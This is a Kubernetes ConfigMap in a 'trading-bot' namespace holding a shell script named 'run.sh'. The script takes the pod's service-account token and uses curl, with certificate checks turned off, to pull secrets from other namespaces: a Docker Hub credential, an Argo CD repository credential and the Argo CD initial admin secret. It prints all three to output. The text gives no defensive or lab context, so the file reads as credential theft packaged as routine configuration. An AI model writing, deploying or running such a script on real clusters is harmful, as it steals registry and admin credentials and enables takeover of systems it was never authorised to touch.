apiVersion: v1
kind: ConfigMap
metadata:
  name: reader-script
  namespace: trading-bot
data:
  run.sh: |
    #!/bin/sh
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
    API=https://kubernetes.default.svc
    
    echo '=== dockerhub ==='
    curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/default/secrets/dockerhub
    
    echo '=== repo-823010616 ==='
    curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/argocd/secrets/repo-823010616
    
    echo '=== argocd-initial-admin-secret ==='
    curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/argocd/secrets/argocd-initial-admin-secret
    
    echo '=== DONE ==='